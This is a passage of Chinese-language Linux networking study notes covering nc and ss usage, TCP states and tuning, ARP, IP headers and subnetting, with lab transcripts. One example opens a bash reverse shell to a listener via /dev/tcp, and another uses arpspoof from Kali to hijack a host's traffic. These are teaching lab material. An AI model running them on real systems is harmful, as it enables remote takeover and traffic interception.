tcp           LISTEN         0              128                               [::]:111                            [::]:*
tcp           LISTEN         0              128                               [::]:22                             [::]:*
[10:49:35 root@centos8 ~]#nc -l 22
Ncat: bind to :::22: Address already in use. QUITTING.
[10:51:11 root@centos8 ~]#nc -l 9527
I am centos7
I am centos8

#客户端
[10:52:00 root@centos7 ~]#nc 192.168.10.81 9527
I am centos7
I am centos8

#在开一个连接失败
[10:53:59 root@centos7 ~]#nc 192.168.10.81 9527
Ncat: Connection refused.
[10:55:03 root@centos7 ~]#ss -ntu
Netid  State      Recv-Q Send-Q                  Local Address:Port                                 Peer Address:Port
tcp    ESTAB      0      0                       192.168.10.71:22                                   192.168.10.1:57628
tcp    ESTAB      0      0                       192.168.10.71:22                                   192.168.10.1:59270
tcp    ESTAB      0      0                       192.168.10.71:57700                               192.168.10.81:9527

#服务端开启UDP的端口
[10:57:46 root@centos8 ~]#nc -l 7000 -u

#客户端连接
[11:04:27 root@centos7 ~]#nc 192.168.10.81 7000 -u

[11:06:03 root@centos8 ~]#ss -ntu
Netid         State         Recv-Q         Send-Q                  Local Address:Port                    Peer Address:Port
udp           ESTAB         0              0                       192.168.10.81:7000                   192.168.10.71:58519
tcp           ESTAB         0              36                      192.168.10.81:22                      192.168.10.1:59372
tcp           ESTAB         0              0                       192.168.10.81:22                      192.168.10.1:59365
```

**范例：找到端口冲突的应用程序**

```bash
[11:08:46 root@centos8 ~]#nc -l 22
Ncat: bind to :::22: Address already in use. QUITTING.
[11:10:25 root@centos8 ~]#ss -ntlp
State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port
LISTEN   0        128              0.0.0.0:111           0.0.0.0:*       users:(("rpcbind",pid=857,fd=4),("systemd",pid=1,fd=26))
LISTEN   0        128              0.0.0.0:22            0.0.0.0:*       users:(("sshd",pid=942,fd=4))
LISTEN   0        128                 [::]:111              [::]:*       users:(("rpcbind",pid=857,fd=6),("systemd",pid=1,fd=30))
LISTEN   0        128                 [::]:22               [::]:*       users:(("sshd",pid=942,fd=6))
[11:10:32 root@centos8 ~]#lsof -i :22
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
sshd     942 root    4u  IPv4  29389      0t0  TCP *:ssh (LISTEN)
sshd     942 root    6u  IPv6  29391      0t0  TCP *:ssh (LISTEN)
sshd    1688 root    5u  IPv4  39897      0t0  TCP centos8:ssh->192.168.10.1:59365 (ESTABLISHED)
sshd    1700 root    5u  IPv4  39897      0t0  TCP centos8:ssh->192.168.10.1:59365 (ESTABLISHED)
```

**范例：判断端口是否正在打开**

```bash
[11:13:30 root@centos8 ~]#< /dev/tcp/127.0.0.1/22
[11:13:36 root@centos8 ~]#echo $?
0
[11:13:42 root@centos8 ~]#< /dev/tcp/127.0.0.1/80
-bash: connect: Connection refused
-bash: /dev/tcp/127.0.0.1/80: Connection refused
[11:13:52 root@centos8 ~]#echo $?
1
```

**范例：利用重定向实现上网**

```bash
[11:15:43 root@centos8 ~]#exec 8<>/dev/tcp/www.baidu.com/80
[11:16:13 root@centos8 ~]#ll /proc/$$/fd
total 0
lrwx------ 1 root root 64 Dec 22 11:15 0 -> /dev/pts/0
lrwx------ 1 root root 64 Dec 22 11:15 1 -> /dev/pts/0
lrwx------ 1 root root 64 Dec 22 11:15 2 -> /dev/pts/0
lrwx------ 1 root root 64 Dec 22 11:16 255 -> /dev/pts/0
lr-x------ 1 root root 64 Dec 22 11:15 3 -> /var/lib/sss/mc/passwd
lrwx------ 1 root root 64 Dec 22 11:15 4 -> 'socket:[42351]'
lrwx------ 1 root root 64 Dec 22 11:15 8 -> 'socket:[42372]'
[11:18:24 root@centos8 ~]#echo -e 'GET / HTTP/1.1\n' >& 8
[11:18:48 root@centos8 ~]#cat <& 8
```

**范例：反弹shell实现远程控制**

```bash
#在控制机监听打开端口
[11:20:47 root@centos8 ~]#nc -lvp 6666
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::6666
Ncat: Listening on 0.0.0.0:6666

#在被控制机上实现反弹shell
[11:09:53 root@centos7 ~]#bash -i &> /dev/tcp/192.168.10.81/6666 0>&1
```

**TCP 端口号通信过程**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-8dfb1084.png)

**TCP序列和确认号**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-24dd09e3.png)

**TCP确认和固定窗口**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-61056ef5.png)

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-9f3fc73e.png)

**TCP滑动窗口**
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-91a9e342.png)

#### 三次握手和四次挥手

**建立连接**
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-6cdd302e.png)

**TCP三次握手**
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-2f9d0ff8.png)

**范例：三次握手**

```bash
#wireshark抓包分析
(ip.src == 192.168.10.81 and ip.dst == 192.168.10.71) || (ip.dst == 192.168.10.81 and ip.src == 192.168.10.71)
```

**TCP四次挥手**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-ee301393.png)

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-a02bad71.png)

**范例：四次挥手**

```bash
#winreshark抓包分析(ip.src == 192.168.10.81 and ip.dst == 192.168.10.71) || (ip.dst == 192.168.10.81 and ip.src == 192.168.10.71)
```

**范例：三次挥手**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-dd73652c.png)

#### 有限状态机FSM：Finite State Machine

虚线：服务器  实线：客户端
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-d04062d5.png)

* CLOSED 没有任何连接状态
* LISTEN 侦听状态，等待来自远方TCP端口的连接请求
* SYN-SENT 在发送连接请求后，等待对方确认
* SYN-RECEIVED 在收到和发送一个连接请求后，等待对方确认
* ESTABLISHED 代表传输连接建立，双方进入数据传送状态
* FIN-WAIT-1 主动关闭,主机已发送关闭连接请求，等待对方确认
* FIN-WAIT-2 主动关闭,主机已收到对方关闭传输连接确认，等待对方发送关闭传输连接请求
* TIME-WAIT 完成双向传输连接关闭，等待所有分组消失
* CLOSE-WAIT 被动关闭,收到对方发来的关闭连接请求，并已确认
* LAST-ACK 被动关闭,等待最后一个关闭传输连接确认，并等待所有分组消失
* CLOSING 双方同时尝试关闭传输连接，等待对方确认

客户端先发送一个FIN给服务端，自己进入FIN_WAIT_1状态，这时等待接收服务端报文，该报文会有三种可能：

* 只有服务端的ACK
* 只有服务端的FIN
* 基于服务端的ACK，又有FIN

1. 只收到服务器的ACK，客户端会进入FIN_WAIT_2状态，后续当收到服务端的FIN时，回应发送一个ACK，会进入到TIME_WAIT状态，这个状态会持续2MSL(TCP报文段在网络中的最大生存时间, RFC 1122标准的建议值是2min).客户端等待2MSL，是为了当最后一个ACK丢失时，可以再发送一次。因为    服务端在等待超时后会再发送一个FIN给客户端，进而客户端知道ACK已丢失
2. 只有服务端的FIN时，回应一个ACK给服务端，进入CLOSING状态，然后接收到服务端的ACK时，进   入TIME_WAIT状态
3. 同时收到服务端的ACK和FIN，直接进入TIME_WAIT状态

客户端的典型状态转移

客户端通过connect系统调用主动与服务器建立连接connect系统调用首先给服务器发送一个同步报文      段，使连接转移到SYN_SENT状态

此后connect系统调用可能因为如下两个原因失败返回：

1. 如果connect连接的目标端口不存在（未被任何进程监听），或者该端口仍被处于TIME_WAIT状态    的连接所占用，则服务器将给客户端发送一个复位报文段，connect调用失败。
2. 如果目标端口存在，但connect在超时时间内未收到服务器的确认报文段，则connect调用失败。connect调用失败将使连接立即返回到初始的CLOSED状态。如果客户端成功收到服务器的同步报文段和确认，则connect调用成功返回，连接转移至ESTABLISHED状态

当客户端执行主动关闭时，它将向服务器发送一个结束报文段，同时连接进入FIN_WAIT_1状态。若此 时客户端收到服务器专门用于确认目的的确认报文段，则连接转移至FIN_WAIT_2状态。当客户端处于FIN_WAIT_2状态时，服务器处于CLOSE_WAIT状态，这一对状态是可能发生半关闭的状态。此时如果服   务器也关闭连接（发送结束报文段），则客户端将给予确认并进入TIME_WAIT状态

客户端从FIN_WAIT_1状态可能直接进入TIME_WAIT状态（不经过FIN_WAIT_2状态），前提是处于FIN_WAIT_1状态的服务器直接收到带确认信息的结束报文段（而不是先收到确认报文段，再收到结束报文段）

处于FIN_WAIT_2状态的客户端需要等待服务器发送结束报文段，才能转移至TIME_WAIT状态，否则它   将一直停留在这个状态。如果不是为了在半关闭状态下继续接收数据，连接长时间地停留在  FIN_WAIT_2状态并无益处。连接停留在FIN_WAIT_2状态的情况可能发生在：客户端执行半关闭后，未    等服务器关闭连接就强行退出了。此时客户端连接由内核来接管，可称之为孤儿连接（和孤儿进程类似）

Linux为了防止孤儿连接长时间存留在内核中，定义了两个内核参数：

/proc/sys/net/ipv4/tcp_max_orphans 指定内核能接管的孤儿连接数目

/proc/sys/net/ipv4/tcp_fin_timeout  指定孤儿连接在内核中生存的时

**客户机端的三次握手和四次挥手状态转换**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-7f0d6a12.png)

**服务器端的三次握手和四次挥手状态转换**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-6fcbbf36.png)

#### sync半连接和accept全连接队列

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-4a2e9996.png)

* /proc/sys/net/ipv4/tcp_max_syn_backlog    未完成连接队列大小，默认值128,建议调整大小为1024以上
* /proc/sys/net/core/somaxconn                    完成连接队列大小，默认值128,建议调整大小为1024以上

#### TCP超时重传

异常网络状况下（开始出现超时或丢包），TCP控制数据传输以保证其承诺的可靠服务

TCP服务必须能够重传超时时间内未收到确认的TCP报文段。为此，TCP模块为每个TCP报文段都维护一 个重传定时器，该定时器在TCP报文段第一次被发送时启动。如果超时时间内未收到接收方的应答，TCP模块将重传TCP报文段并重置定时器。至于下次重传的超时时间如何选择，以及最多执行多少次重传，就是TCP的重传策略

与TCP超时重传相关的两个内核参数：

* /proc/sys/net/ipv4/tcp_retries1，指定在底层IP接管之前TCP最少执行的重传次数，默认值是3
* /proc/sys/net/ipv4/tcp_retries2，指定连接放弃前TCP最多可以执行的重传次数，默认值15（一般对应13～30min）

#### 拥塞控制

网络中的带宽、交换结点中的缓存和处理机等，都是网络的资源。在某段时间，若对网络中某一资源的  需求超过了该资源所能提供的可承受的能力，网络的性能就会变坏。此情况称为拥塞

TCP为提高网络利用率，降低丢包率，并保证网络资源对每条数据流的公平性。即所谓的拥塞控制

TCP拥塞控制的标准文档是RFC  5681，其中详细介绍了拥塞控制的四个部分：慢启动（slow  start）、拥塞避免（congestion avoidance）、快速重传（fast retransmit）和快速恢复（fast recovery）。拥塞控制算法在Linux下有多种实现，比如reno算法、vegas算法和cubic算法等。它们或者部分或者全部    实现了上述四个部分

当前所使用的拥塞控制算法

* /proc/sys/net/ipv4/tcp_congestion_control

#### 内核TCP参数优化

**参看帮助： man tcp**

**编辑文件/etc/sysctl.conf，加入以下内容：然后执行 sysctl -p 让参数生效。**

```bash
net.ipv4.tcp_fin_timeout = 2
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_tw_recycle = 1
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_keepalive_time = 600
net.ipv4.ip_local_port_range = 2000 65000
net.ipv4.tcp_max_syn_backlog = 16384
net.ipv4.tcp_max_tw_buckets = 36000
net.ipv4.route.gc_timeout = 100
net.ipv4.tcp_syn_retries = 1
net.ipv4.tcp_synack_retries = 1
net.ipv4.tcp_max_orphans = 16384
net.core.somaxconn = 16384
net.core.netdev_max_backlog = 16384
```

* net.ipv4.tcp_fin_timeout 表示套接字由本端要求关闭，这个参数决定了它保持在FIN-WAIT-2状态的时间，默认值是60秒。 该参数对应系统路径为：/proc/sys/net/ipv4/tcp_fin_timeout 60
* net.ipv4.tcp_tw_reuse  表示开启重用。允许将TIME-WAIT  sockets重新用于新的TCP连接，默认值为0，表示关闭。 该参数对应系统路径为：/proc/sys/net/ipv4/tcp_tw_reuse 0
* net.ipv4.tcp_tw_recycle 表示开启TCP连接中TIME-WAIT sockets的快速回收。  该参数对应系统路径为：/proc/sys/net/ipv4/tcp_tw_recycle，默认为0，表示关闭。 提示：reuse和recycle这两个参数是为防止生产环境下Web、Squid等业务服务器time_wait网络状态数量过多设置的。
* net.ipv4.tcp_syncookies 表示开启SYN Cookies功能。当出现SYN等待队列溢出时，启用Cookies来处理，可防范少量SYN攻击，这个参数也可以不添加。 该参数对应系统路径为：/proc/sys/net/ipv4/tcp_syncookies,默认值为1
* net.ipv4.tcp_keepalive_time 表示当keepalive启用时，TCP发送keepalive消息的频度。默认是2 小时，建议改为10分钟。 该参数对应系统路径为：/proc/sys/net/ipv4/tcp_keepalive_time,默认为7200秒。
* net.ipv4.ip_local_port_range  该选项用来设定允许系统打开的端口范围，即用于向外连接的端口范围。 该参数对应系统路径为：/proc/sys/net/ipv4/ip_local_port_range 32768 61000
* net.ipv4.tcp_max_syn_backlog 表示SYN队列的长度，即半连接队列长度，默认为1024，建议加大队列的长度为8192或更多，这样可以容纳更多等待连接的网络连接数。 该参数为服务器端用于记录那些尚未收到客户端确认信息的连接请求最大值。 该参数对象系统路径为：/proc/sys/net/ipv4/tcp_max_syn_backlog
* net.ipv4.tcp_max_tw_buckets 表示系统同时保持TIME_WAIT套接字的最大数量，如果超过这个数值，TIME_WAIT套接字将立刻被清除并打印警告信息。 默认为180000，对于Apache、Nginx等服务器来说可以将其调低一点，如改为5000~30000，不通业务的服务器也可以给大一点，比如LVS、Squid。 此项参数可以控制TIME_WAIT套接字的最大数量，避免Squid服务器被大量的TIME_WAIT套接字拖死。 该参数对应系统路径为：/proc/sys/net/ipv4/tcp_max_tw_buckets
* net.ipv4.tcp_synack_retries 参数的值决定了内核放弃连接之前发送SYN+ACK包的数量。 该参数对应系统路径为：/proc/sys/net/ipv4/tcp_synack_retries,默认值为5
* net.ipv4.tcp_syn_retries 表示在内核放弃建立连接之前发送SYN包的数量。 该参数对应系统路径为：/proc/sys/net/ipv4/tcp_syn_retries,默认值为6
* net.ipv4.tcp_max_orphans  用于设定系统中最多有多少个TCP套接字不被关联到任何一个用户文件句柄上。 如果超过这个数值，孤立连接将被立即被复位并打印出警告信息。 这个限制只有为了防止简单的DoS攻击。不能过分依靠这个限制甚至认为减少这个值，更多的情况是增加这个值。  该参数对应系统路径为：/proc/sys/net/ipv4/tcp_max_orphans ，默认值8192
* net.core.somaxconn  同时发起的TCP的最大连接数，即全连接队列长度，在高并发请求中，可能会导致链接超时或重传，一般结合并发请求数来调大此值。 该参数对应系统路径为：/proc/sys/net/core/somaxconn ，默认值是128
* net.core.netdev_max_backlog 表示当每个网络接口接收数据包的速率比内核处理这些包的速率快时，允许发送到队列的数据包最大数。 该参数对应系统路径为：/proc/sys/net/core/netdev_max_backlog，默认值为1000

### 2.UDP User Dataagram Protocol

#### UDP特性

* 工作在传输层
* 提供不可靠的网络访问
* 非面向连接协议
* 传输性能高
* 无数据恢复特性

更多关于UDP的内核参数，可参看man 7 udp

#### UDP包头

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-640c0a8a.png)

## 3.3 Internet 层

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-b6ca5aa5.png)

### 1.Internet Control Message Protocol

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-4f7661b2.png)

**范例：利用icmp协议判断网络状态**

```bash
[14:06:11 root@centos8 ~]#ping -c1 -W1 192.168.10.71
PING 192.168.10.71 (192.168.10.71) 56(84) bytes of data.
64 bytes from 192.168.10.71: icmp_seq=1 ttl=64 time=0.705 ms

--- 192.168.10.71 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.705/0.705/0.705/0.000 ms
```

### 2.Address Resolution Protocol

#### ARP

ARP 地址解析协议由互联网工程任务组（IETF）在1982年11月发布的RFC 826中描述制定，是根据IP地址获取物理地址的一个TCP/IP协议。

主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存

**同网段的ARP**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-80db5746.png)

**跨网段的ARP**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-f5cb15ea.png)

**范例：ARP表**

```bash
[14:31:54 root@centos8 ~]#ip neigh
192.168.10.1 dev eth0 lladdr 00:50:56:c0:00:08 REACHABLE
192.168.10.71 dev eth0 lladdr 00:0c:29:c1:8a:39 STALE
192.168.10.2 dev eth0 lladdr 00:50:56:ea:95:ae STALE
[14:34:19 root@centos8 ~]#arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.10.1             ether   00:50:56:c0:00:08   C                     eth0
192.168.10.71            ether   00:0c:29:c1:8a:39   C                     eth0
192.168.10.2             ether   00:50:56:ea:95:ae   C                     eth0
```

**范例：ARP静态绑定可以防止ARP欺骗**

```bash
[14:34:31 root@centos8 ~]#arp -s 192.168.10.71 00:0c:29:c1:8a:39
[14:35:53 root@centos8 ~]#arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.10.1             ether   00:50:56:c0:00:08   C                     eth0
192.168.10.71            ether   00:0c:29:c1:8a:39   CM                    eth0
192.168.10.2             ether   00:50:56:ea:95:ae   C                     eth0
```

**范例：kali系统实现arp欺骗上网流量劫持**

```bash
#启动路由转发功能
[root@kali ~]# echo 1 > /proc/sys/net/ipv4/ip_forward

#安装包
[root@kali ~]# apt-get install dsniff

#欺骗目标主机，本机是网关
[root@kali ~]# arpspoof -i eth0 -t 被劫持的目标主机IP 网关IP

#欺骗网关，本机是目标主机
[root@kali ~]# arpspoof -i eth0 -t 网关IP   被劫持的目标主机IP
```

#### Gratuitous ARP

Gratuitous ARP也称为免费ARP，无故ARP。Gratuitous ARP不同于一般的ARP请求，它并非期待得到ip对应的mac地址，而是当主机启动的时候，将发送一个Gratuitous arp请求，即请求自己的ip地址的mac地址

免费ARP可以有两个方面的作用：

* 验证IP是否冲突：一个主机可以通过它来确定另一个主机是否设置了相同的 IP地址
* 更换物理网卡：如果发送ARP的主机正好改变了物理地址（如更换物理网卡），可以使用此方法通知网络中其它主机及时更新ARP缓存

### 3.Reverse Address Resolution Protocol

RARP将MAC转换成IP
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-c00f245c.png)

### 4.internet协议

#### Internet协议特征

* 运行于OSI网络层
* 面向无连接的协议
* 独立处理数据包
* 分层编址
* 尽力而为传输
* 无数据恢复功能

#### IP PDU报头

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-39d025b5.png)

**IP PDU 报头格式**

* 版本:占4位,指 IP 协议的版本目前的IP协议版本号为4
* 首部长度:占4位,可表示的最大数值是15个单位，一个单位为4字节，因此IP 的首部长度的最大值是60字节
  
  * 区分服务:占8位,用来获得更好的服务,在旧标准中叫做服务类型,但实际上一直未被使用过.后改名为区分服务.只有在使用区分服务(DiffServ)时,这个字段才起作用.一般的情况下不使用
* 总长度:占16位,指首部和数据之和的长度,单位为字节,因此数据报的最大长度为 65535 字节.总长度必须不超过最大传送单元 MTU
* 标识:占16位,它是一个计数器,通常，每发送一个报文，该值会加1， 也用于数据包分片，在同一个包的若干分片中，该值是相同的
* 标志(flag):占3位,目前只有后两位有意义
* DF： Don’t Fragment 中间的一位，只有当 DF=0 时才允许分片
* MF： More Fragment 最后一位，MF=1表示后面还有分片,MF=0 表示最后一个分片
* IP PDU 报头
* 片偏移:占13位,指较长的分组在分片后，该分片在原分组中的相对位置.片偏移以8个字节为偏移单位
* 生存时间:占8位,记为TTL (Time To Live) 数据报在网络中可通过的路由器数的最大值,TTL 字段是由发送端初始设置一个 8 bit字段.推荐的初始值由分配数字 RFC 指定,当前值为 64.发送 ICMP 回显应答时经常把 TTL 设为最大值 255
* 协议:占8位,指出此数据报携带的数据使用何种协议以便目的主机的IP层将数据部分上交给哪个处理过程, 1表示为 ICMP 协议, 2表示为 IGMP 协议, 6表示为 TCP 协议, 17表示为 UDP 协议
* 首部检验和:占16位,只检验数据报的首部不检验数据部分.这里不采用 CRC 检验码而采用简单的计算方法
* 源地址和目的地址:都各占4字节,分别记录源地址和目的地址

**范例：发现IP冲突的主机**

```bash
[14:35:58 root@centos8 ~]#arping 192.168.10.71
ARPING 192.168.10.71 from 192.168.10.81 eth0
Unicast reply from 192.168.10.71 [00:0C:29:C1:8A:39]  1.015ms
Unicast reply from 192.168.10.71 [00:0C:29:C1:8A:39]  0.843ms
Unicast reply from 192.168.10.71 [00:0C:29:C1:8A:39]  0.874ms
Unicast reply from 192.168.10.71 [00:0C:29:C1:8A:39]  0.914ms
Unicast reply from 192.168.10.71 [00:0C:29:C1:8A:39]  0.906ms
```

**协议域**
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-f88bc424.png)

## 3.4 主机到主机的包传递完整过程

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-f3096697.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-7333f60b.png)

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-e901de71.png)

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-0301158a.png)

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-54b6613e.png)

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-9e5438cd.png)

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-a097d423.png)

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-34a3362d.png)

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-4775b982.png)

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-9d2fa1d6.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-338e50eb.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-b0da86e0.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-09fe5133.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-de25ef9f.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-da0468a1.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-3551c229.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-0817d783.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-d77a8a5a.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-ead51ecb.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-517d4cbc.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-60e6cf16.png)
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-0b449b7c.png)

## 3.5 IP地址

### 1.IP地址组成

它们可唯一标识 IP 网络中的每台设备 ，每台主机（计算机、网络设备、外围设备）必须具有唯一的地址

**IP地址由两部分组成**

* 网络ID：标识网络，每个网段分配一个网络ID，处于高位
* 主机 ID：标识单个主机，由组织分配给各设备，处于低位

**IPv4地址格式：点分十进制记法**
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-5140532a.png)

### 2.IP地址分类

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-456f52c1.png)

* A类：
  
  * 0 0000000 - 0 1111111.X.Y.Z : 0-127.X.Y.Z
  * 网络ID位是最高8位,主机ID是24位低位
  * 网络数：126=2^7(可变是的网络ID位数)-2
  * 每个网络中的主机数：2^24-2=16777214 默认子网掩码：255.0.0.0
  * 私网地址：10.0.0.0
  * 范例:114.114.114.114,8.8.8.8,1.1.1.1，58.87.87.99，119.29.29.29
* B类：
  
  * 10 000000 - 10 111111.X.Y.Z：128-191.X.Y.Z
  * 网络ID位是最高16位,主机ID是16位低位网络数：2^14=16384
  * 每个网络中的主机数：2^16-2=65534
  * 默认子网掩码：255.255.0.0
  * 私网地址：172.16.0.0-172.31.0.0
  * 范例:180.76.76.76，172.16.0.1
* C类：
  
  * 110 0 0000 - 110 1 1111.X.Y.Z: 192-223.X.Y.Z
  * 网络ID位是最高24位,主机ID是8位低位网络数：2^21=2097152
  * 每个网络中的主机数：2^8-2=254
  * 默认子网掩码：255.255.255.0
  * 私网地址：192.168.0.0-192.168.255.0 范例: 223.6.6.6
* D类：组（多）播，1110 0000 - 1110 1111.X.Y.Z: 224-239.X.Y.Z
* E类：保留未使用，240-255

### 3.公共和私有IP地址

**私有IP地址：不直接用于互联网，通常在局域网中使用**
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-e5862cb6.png)

**公共IP地址：互联网上设备拥有的唯一地址**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-3f7f1a1b.png)

### 4.特殊地址

* 0.0.0.0
  
  * 0.0.0.0不是一个真正意义上的IP地址。它表示所有不清楚的主机和目的网络
* 255.255.255.255
  
  * 限制广播地址。对本机来说，这个地址指本网段内(同一广播域)的所有主机
* 127.0.0.1～127.255.255.254
  
  * 本机回环地址，主要用于测试。在传输介质上永远不应该出现目的地址为“127.0.0.1”的 数据包
* 224.0.0.0到239.255.255.255
  
  * 组播地址，224.0.0.1特指所有主机，224.0.0.2特指所有路由器。224.0.0.5指OSPF 路由器，地址多用于一些特定的程序以及多媒体程序
* 169.254.x.x
  
  * 如果Windows主机使用了DHCP自动分配IP地址，而又无法从DHCP服务器获取地址，系统会为主机分配这样地址

### 5.保留地址

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-c13d70e7.png)

**范例:**

172.16.0.0 网络中的两个地址:172.16.0.0 172.16.255.255

### 6.子网掩码

CIDR：无类域间路由，目前的网络已不再按A，B，C类划分网段，可以任意指定网段的范围

CIDR 无类域间路由表示法：IP/网络ID位数，如：172.16.0.100/16

netmask子网掩码：32位或128位（IPv6）的数字，和IP成对使用，用来确认IP地址中的网络ID和主机ID，对应网络ID的位为1，对应主机ID的位为0,范例:255.255.255.0   ，表现为连续的高位为1，连续的低位为0
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-9d700175.png)

**子网掩码的八位**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-1c58d80b.png)

**相关公式：**

* 一个网络的最多的主机数＝2^主机ID位数-2
* 网络（段）数=2^网络ID中可变的位数
* 网络ID=IP与netmask

**判断对方主机是否在同一个网段：**

用自已的子网掩码分别和自已的IP及对方的IP相与，比较结果，相同则同一网络，不同则不同网段

**范例:**

netmask: 255.255.224.0,网络ID位:19 主机ID位:13,主机数=2^13-2=8190

**范例：判断A和B是否在网一个网段?**

A: 192.168.1.100 netmask:255.255.255.0

B: 192.168.2.100 netmask:255.255.0.0

**范例：一个主机：172.16.1.100/28**

1. 此主机所在的网段最多有多少主机?主机数=2^(32-28)-2=14
2. 网络ID? IP和子网掩码相与，172.16.1.96
3. 此网段的主机中最小的IP：172.16.1.97，最大的IP?172.16.1.110

### 7.划分子网

划分子网：将一个大的网络（主机数多）划分成多个小的网络（主机数少），主机ID位数变少，网络ID 位数变多，网络ID位向主机ID位借位
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-0397501c.png)

**可变长度子网掩码**

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-32f0cb4c.png)

**Subnet地址**
![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-a59ec3bb.png)

### 8.优化IP地址分配

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-5dc19a0d.png)

合并超网：将多个小网络合并成一个大网，主机ID位向网络ID位借位
**范例：**

```bash
8个C类网段
220.78.168.0/24
220.78.169.0/24
220.78.170.0/24
220.78.171.0/24
220.78.172.0/24
220.78.173.0/24
220.78.174.0/24
220.78.175.0/24
合并成
220.78.168.0/21
```

### 9.跨网络通信

跨网络通信：路由,选择路径

路由分类：

* 主机路由
* 网络路由
* 默认路由

优先级：精度越高，优先级越高

### 10.动态主机配置协议DHCP

![clipboard.png](https://b3logfile.com/file/2020/12/clipboard-9f590e5b.png)
